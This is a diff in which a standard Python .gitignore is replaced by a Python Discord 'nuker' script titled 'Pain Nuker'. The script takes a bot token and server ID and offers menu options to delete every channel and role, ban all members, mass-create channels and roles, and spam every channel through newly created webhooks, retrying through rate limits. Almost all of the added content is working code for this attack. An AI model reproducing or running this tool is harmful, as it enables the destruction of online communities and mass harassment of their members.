@@ -1,207 +1,319 @@
-# Byte-compiled / optimized / DLL files
-__pycache__/
-*.py[codz]
-*$py.class
+import os, asyncio, aiohttp, sys, random, time
+from datetime import datetime
+from colorama import Fore , Style
+from packaging import version
+try:
+    from pystyle import Colorate, Write, System, Colors, Center, Anime
+    import requests
+except:
+    import os
+    os.system("pip install pystyle")
+    os.system("pip install requests")
+import ctypes
 
-# C extensions
-*.so
+def set_console_title(title):
+    ctypes.windll.kernel32.SetConsoleTitleW(title)
 
-# Distribution / packaging
-.Python
-build/
-develop-eggs/
-dist/
-downloads/
-eggs/
-.eggs/
-lib/
-lib64/
-parts/
-sdist/
-var/
-wheels/
-share/python-wheels/
-*.egg-info/
-.installed.cfg
-*.egg
-MANIFEST
+  
 
-# PyInstaller
-#  Usually these files are written by a python script from a template
-#  before PyInstaller builds the exe, so as to inject date/other infos into it.
-*.manifest
-*.spec
+    
+__VERSION__ = '1.7382047493'  
 
-# Installer logs
-pip-log.txt
-pip-delete-this-directory.txt
+try:
+    os.system('clear')
+        
+except:
+    os.system('clear')
+    
+def get_token():
+    global token
+    token = input("\033[38;2;255;225;0mT\033[0m\033[38;2;255;235;0mo\033[0m\033[38;2;255;245;0mk\033[0m\033[38;2;255;255;0me\033[0m\033[38;2;255;205;0mn\033[0m\033[38;2;255;195;0m:\033[0m ")
+    headers = {
+        "Authorization": f"Bot {token}"
+    }
+    if not 'id' in requests.Session().get("https://discord.com/api/v10/users/@me", headers=headers).json():
+        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mInvalid Token\033[0m")
+        return get_token()
+     
+get_token()
+guild_id = input("\033[38;2;255;225;0mG\033[0m\033[38;2;255;235;0mu\033[0m\033[38;2;255;245;0mi\033[0m\033[38;2;255;255;0ml\033[0m\033[38;2;255;205;0md\033[0m\033[38;2;255;195;0m \033[0m\033[38;2;255;185;0mI\033[0m\033[38;2;255;175;0md\033[0m\033[38;2;255;165;0m:\033[0m ")
 
-# Unit test / coverage reports
-htmlcov/
-.tox/
-.nox/
-.coverage
-.coverage.*
-.cache
-nosetests.xml
-coverage.xml
-*.cover
-*.py.cover
-.hypothesis/
-.pytest_cache/
-cover/
+headers = {
+  "Authorization": f"Bot {token}"
+}
 
-# Translations
-*.mo
-*.pot
+def purplepink(text):
+    os.system(""); faded = ""
+    red = 120
+    for line in text.splitlines():
+        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
+        if not red == 255:
+            red += 15
+            if red > 255:
+                red = 255
+    return faded
 
-# Django stuff:
-*.log
-local_settings.py
-db.sqlite3
-db.sqlite3-journal
+        
 
-# Flask stuff:
-instance/
-.webassets-cache
+async def create_channels(session,channel_name, type:int=0):
+    while True:
+        try:
+            async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json={'name': channel_name, 'type': type}) as r:
+                if r.status == 429:
+                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
+                else:
+                    if r.status in [200, 201, 204]:
+                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mCreated Channel to {guild_id} - {channel_name}")
+                        break
+                    else:
+                        break
+        except:
+            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Create Channel to {guild_id}")
+            pass
 
-# Scrapy stuff:
-.scrapy
+async def create_roles(session,role_name):
+    while True:
+        try:
+            async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers, json={'name': role_name}) as r:
+                if r.status == 429:
+                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
+                else:
+                    if r.status in [200, 201, 204]:
+                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mCreated Role to {guild_id} - {role_name}")
+                        break
+                    else:
+                        break
+        except:
+            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Create Role to {guild_id}")
+            pass
 
-# Sphinx documentation
-docs/_build/
+async def send_message(hook, message, amount:int):
+    async with aiohttp.ClientSession() as session:
+        for i in range(amount):
+            await session.post(hook,json={'content': message, 'tts': False})
+            
+            
+async def WebhookSpam(session, channel_id, web_name, msg_amt:int, msg):
+  
+    try:
+        async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/webhooks', headers=headers, json={'name': web_name}) as r:
+            if r.status == 429:
+                print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
+            else:
+                if r.status in [200, 201, 204]:
+                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mCreated Webhook {web_name} to {channel_id}")
+                    webhook_raw = await r.json()
+                    webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
+                    asyncio.create_task(send_message(webhook, msg, msg_amt))
+                    
+                    
+    except:
+        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCreate Webhook to {channel_id}")
+        
+        
+async def get_roles():
+   
+    roleIDS = []
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers) as r:
+       
+             m = await r.json()
+             for role in m:
+                roleIDS.append(role["id"])
+            
+    except TypeError:
+        print("SUS RATELIMTED...!")
+         
+    return roleIDS
 
-# PyBuilder
-.pybuilder/
-target/
+async def get_channels():
+   
+    channelIDS = []
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers) as r:
+       
+             m = await r.json()
+             for channel in m:
+                 channelIDS.append(channel["id"])
+            
+    except TypeError:
+        print("SUS RATELIMTED...!")
+         
+    return channelIDS
+    
+    
+async def get_members():
+   
+    memberIDS = []
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers) as r:
+       
+             m = await r.json()
+             for member in m:
+                memberIDS.append(member["user"]["id"])
+            
+    except TypeError:
+        print("SUS RATELIMTED...!")
+         
+    return memberIDS
 
-# Jupyter Notebook
-.ipynb_checkpoints
+async def ban_members(session, member_id:str):
+    while True:
+        try:
+            async with session.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}", headers=headers) as r:
+                if r.status == 429:
+                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
+                else:
+                    if r.status in [200, 201, 204]:
+                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mBanned Member {member_id}")
+                        break
+                    else:
+                        break
+        except:
+            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Ban Member {member_id}")
 
-# IPython
-profile_default/
-ipython_config.py
+async def delete_channels(session, channel_id:str):
+    while True:
+        try:
+            async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as r:
+                if r.status == 429:
+                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
+                else:
+                    if r.status in [200, 201, 204]:
+                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mDeleted Channel {channel_id}")
+                        break
+                    else:
+                        break
+        except:
+            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Delete Channel {channel_id}")
 
-# pyenv
-#   For a library or package, you might want to ignore these files since the code is
-#   intended to run in multiple environments; otherwise, check them in:
-# .python-version
+async def delete_role(session, role_id:str):
+    while True:
+        try:
+            async with session.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}', headers=headers) as r:
+                if r.status == 429:
+                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRatelimited, retrying soon..")
+                else:
+                    if r.status in [200, 201, 204]:
+                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mDeleted Role {role_id}")
+                        break
+                    else:
+                        break
+        except:
+            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Delete Role {role_id}")
 
-# pipenv
-#   According to pypa/pipenv#598, it is recommended to include Pipfile.lock in version control.
-#   However, in case of collaboration, if having platform-specific dependencies or dependencies
-#   having no cross-platform support, pipenv may install dependencies that don't work, or not
-#   install all needed dependencies.
-#Pipfile.lock
+def slow_write(text):
+    for x in text: print('' + x, end="");sys.stdout.flush();time.sleep(0.0005)
+async def main():
+    try:
+        os.system('clear')
+        
+    except:
+        os.system('clear')
+        
+    logo = Center.XCenter(f"""  
+          ██▓███   ▄▄▄       ██▓ ███▄    █                
+         ▓██░  ██▒▒████▄    ▓██▒ ██ ▀█   █                
+         ▓██░ ██▓▒▒██  ▀█▄  ▒██▒▓██  ▀█ ██▒               
+         ▒██▄█▓▒ ▒░██▄▄▄▄██ ░██░▓██▒  ▐▌██▒               
+         ▒██▒ ░  ░ ▓█   ▓██▒░██░▒██░   ▓██░               
+         ▒▓▒░ ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░   ▒ ▒                
+         ░▒ ░       ▒   ▒▒ ░ ▒ ░░ ░░   ░ ▒░               
+         ░░         ░   ▒    ▒ ░   ░   ░ ░                
+                        ░  ░ ░           ░                
+                                                          
+                ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
+                ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
+               ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
+               ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
+               ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
+               ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
+               ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
+                  ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
+                        ░    ░     ░  ░      ░  ░   ░     
+                                                           """)
+    time.sleep(0.0002)
+    #print(Colorate.Vertical(Colors.red_to_purple, logo))
+    print(purplepink(logo), end='')
+    print(f"""                                  
+                  \033[38;2;255;0;205m╔══════════════════════════════╦═══════════════════════════════╗\033[0m
+                  \033[38;2;255;0;180m║   \033[37mVersion: {version.parse(__VERSION__)}      \033[38;2;255;0;180m║   \033[37mDev: Kyoja ElRoMaNy \033[38;2;255;0;180m        ║\033[0m
+                  \033[38;2;255;0;155m╚══════════════════════════════╩═══════════════════════════════╝\033[0m
+         \033[38;2;255;0;130m╔══════════════════════════╦══════════════════════════╦════════════════════════╗\033[0m
+         \033[38;2;255;0;105m║   \033[37m[1] Delete Channels    \033[38;2;255;0;105m║    \033[37m[2] Delete Roles      \033[38;2;255;0;105m║    \033[37m[3] Ban Members     \033[38;2;255;0;105m║\033[0m
+         \033[38;2;255;0;80m╠══════════════════════════╬══════════════════════════╬════════════════════════╣\033[0m
+         \033[38;2;255;0;55m║   \033[37m[4] Create Channels    \033[38;2;255;0;55m║    \033[37m[5] Create Roles      \033[38;2;255;0;55m║    \033[37m[6] Webhook Spam    \033[38;2;255;0;55m║\033[0m
+         \033[38;2;255;0;30m╚══════════════════════════╩══════════════════════════╩════════════════════════╝\033[0m       
+    """)
+    choose = input(Fore.LIGHTRED_EX+"choose:")
+    if choose == '1':
+        channels = await get_channels()
+        async with aiohttp.ClientSession() as session:
+           await asyncio.gather(*[delete_channels(session, channel_id) for channel_id in channels])
+           #async with tasksio.TaskPool(20_000) as pool:
+              # for channel_id in channels:
+            #await pool.put(delete_channels(session, channel_id))
 
-# UV
-#   Similar to Pipfile.lock, it is generally recommended to include uv.lock in version control.
-#   This is especially recommended for binary packages to ensure reproducibility, and is more
-#   commonly ignored for libraries.
-#uv.lock
+        await asyncio.sleep(1)
+        await main()
+    
+    elif choose == '2':
+        roles = await get_roles()
+        async with aiohttp.ClientSession() as session:
+           await asyncio.gather(*[delete_role(session, role_id) for role_id in roles])
+           
 
-# poetry
-#   Similar to Pipfile.lock, it is generally recommended to include poetry.lock in version control.
-#   This is especially recommended for binary packages to ensure reproducibility, and is more
-#   commonly ignored for libraries.
-#   https://python-poetry.org/docs/basic-usage/#commit-your-poetrylock-file-to-version-control
-#poetry.lock
-#poetry.toml
+        await asyncio.sleep(1)
+        await main()
+    
+    elif choose == '4':
+        chan_name = input(Fore.LIGHTRED_EX+"Channel Name:  ")
+        amt = int(input(Fore.LIGHTRED_EX+"Amount:  "))
+        async with aiohttp.ClientSession() as session:
+            await asyncio.gather(*[create_channels(session, chan_name, 0) for i in range(amt)])
+            
+            
+        await asyncio.sleep(1)
+        await main()        
+    elif choose == '6':
+        web_name = "kyoja ElRoMaNy"
+        web_msg = input(Fore.LIGHTRED_EX+"Webhook Content:  ")
+        msg_amt = int(input(Fore.LIGHTRED_EX+"Amount of Messages:  "))
+        
+        channels = await get_channels()
+        async with aiohttp.ClientSession() as session:
+            await asyncio.gather(*[WebhookSpam(session, channel_id, web_name, msg_amt, web_msg) for channel_id in channels])
+            
+            
+            
+        await asyncio.sleep(1)
+        await main()
+    elif choose == '3':
+        members = await get_members()
+        async with aiohttp.ClientSession() as session:
+            await asyncio.gather(*[ban_members(session, member_id) for member_id in members])
+            
+            
+        await asyncio.sleep(1)
+        await main()
+        
+    elif choose == '5':
+        role_name = input(Fore.LIGHTRED_EX+"Role Name:  ")
+        amt = int(input(Fore.LIGHTRED_EX+"Amount:  "))
+        async with aiohttp.ClientSession() as session:
+            await asyncio.gather(*[create_roles(session, role_name) for i in range(amt)])
+            
+            
+        await asyncio.sleep(1)
+        await main()
+        
+    else:
+        await asyncio.sleep(1)
+        await main()
 
-# pdm
-#   Similar to Pipfile.lock, it is generally recommended to include pdm.lock in version control.
-#   pdm recommends including project-wide configuration in pdm.toml, but excluding .pdm-python.
-#   https://pdm-project.org/en/latest/usage/project/#working-with-version-control
-#pdm.lock
-#pdm.toml
-.pdm-python
-.pdm-build/
-
-# pixi
-#   Similar to Pipfile.lock, it is generally recommended to include pixi.lock in version control.
-#pixi.lock
-#   Pixi creates a virtual environment in the .pixi directory, just like venv module creates one
-#   in the .venv directory. It is recommended not to include this directory in version control.
-.pixi
-
-# PEP 582; used by e.g. github.com/David-OConnor/pyflow and github.com/pdm-project/pdm
-__pypackages__/
-
-# Celery stuff
-celerybeat-schedule
-celerybeat.pid
-
-# SageMath parsed files
-*.sage.py
-
-# Environments
-.env
-.envrc
-.venv
-env/
-venv/
-ENV/
-env.bak/
-venv.bak/
-
-# Spyder project settings
-.spyderproject
-.spyproject
-
-# Rope project settings
-.ropeproject
-
-# mkdocs documentation
-/site
-
-# mypy
-.mypy_cache/
-.dmypy.json
-dmypy.json
-
-# Pyre type checker
-.pyre/
-
-# pytype static type analyzer
-.pytype/
-
-# Cython debug symbols
-cython_debug/
-
-# PyCharm
-#  JetBrains specific template is maintained in a separate JetBrains.gitignore that can
-#  be found at https://github.com/github/gitignore/blob/main/Global/JetBrains.gitignore
-#  and can be added to the global gitignore or merged into this file.  For a more nuclear
-#  option (not recommended) you can uncomment the following to ignore the entire idea folder.
-#.idea/
-
-# Abstra
-# Abstra is an AI-powered process automation framework.
-# Ignore directories containing user credentials, local state, and settings.
-# Learn more at https://abstra.io/docs
-.abstra/
-
-# Visual Studio Code
-#  Visual Studio Code specific template is maintained in a separate VisualStudioCode.gitignore 
-#  that can be found at https://github.com/github/gitignore/blob/main/Global/VisualStudioCode.gitignore
-#  and can be added to the global gitignore or merged into this file. However, if you prefer, 
-#  you could uncomment the following to ignore the entire vscode folder
-# .vscode/
-
-# Ruff stuff:
-.ruff_cache/
-
-# PyPI configuration file
-.pypirc
-
-# Cursor
-#  Cursor is an AI-powered code editor. `.cursorignore` specifies files/directories to
-#  exclude from AI features like autocomplete and code analysis. Recommended for sensitive data
-#  refer to https://docs.cursor.com/context/ignore-files
-.cursorignore
-.cursorindexingignore
-
-# Marimo
-marimo/_static/
-marimo/_lsp/
-__marimo__/
+if __name__ == "__main__":
+    
+    asyncio.run(main())
